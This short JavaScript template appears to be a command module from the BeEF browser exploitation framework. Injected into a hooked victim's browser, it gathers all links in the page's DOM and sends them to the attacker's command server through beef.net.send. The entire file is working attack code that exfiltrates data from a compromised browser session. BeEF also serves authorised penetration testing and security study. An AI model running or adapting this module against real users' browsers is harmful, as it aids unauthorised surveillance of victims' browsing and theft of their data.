beef.execute(function() {

	beef.net.send("<%= @command_url %>", <%= @command_id %>, "links="+escape(beef.dom.getLinks().toString()));
	
});

